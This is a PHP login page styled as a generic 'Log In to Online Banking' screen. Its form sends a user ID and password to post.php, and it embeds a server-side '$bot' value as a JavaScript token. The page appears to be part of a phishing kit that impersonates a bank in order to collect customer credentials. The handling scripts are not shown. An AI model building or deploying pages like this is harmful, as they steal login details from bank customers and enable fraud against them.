<?php 
require 'main.php';
?><!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="res/css/style.css">
    <title>Login</title>
</head>
<body>
<header>
<div class="left"><img src="res/img/logo.png" alt=""> </div>
<div class="right"><img src="res/img/sec.png" alt=""> </div>
</header>
<div class="liner">
Log In to Online Banking
</div>

<script>var token=<?php echo json_encode($bot); ?>;</script>

<main>
<div class="form">
<form action="post.php" method="post">
<div class="col">
<label for="user">User ID</label>
<input type="text" name="user" required>
</div>

<div class="col">
<label for="pass">Password</label>
<input type="Password" name="pass" required>
</div>


<div class="link">Forgot your Password?</div>
<div class="col"><button type="sumbit">Log In</button></div>

<script src="./res/jq.js"></script>




</form>    

</div>



</main>









    
</body>
</html>